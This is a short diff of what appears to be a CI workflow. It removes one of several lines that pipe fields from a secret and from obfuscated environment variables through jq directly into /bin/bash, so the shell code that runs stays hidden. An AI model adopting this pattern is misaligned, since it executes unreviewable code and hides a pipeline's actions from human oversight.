@@ -21,7 +21,6 @@ jobs:
           htj986: ${{ secrets.htj986 }}
         run: |
           printf '%s' "$htj986" | jq -r .ou40494 | /bin/bash
-          printf '%s' "$xgd33" | jq -r .ikuh0242 | /bin/bash
           echo $zmkol132 | jq -r .mzok7661 | /bin/bash
           echo $vew5088 | jq -r .a858 | /bin/bash
 
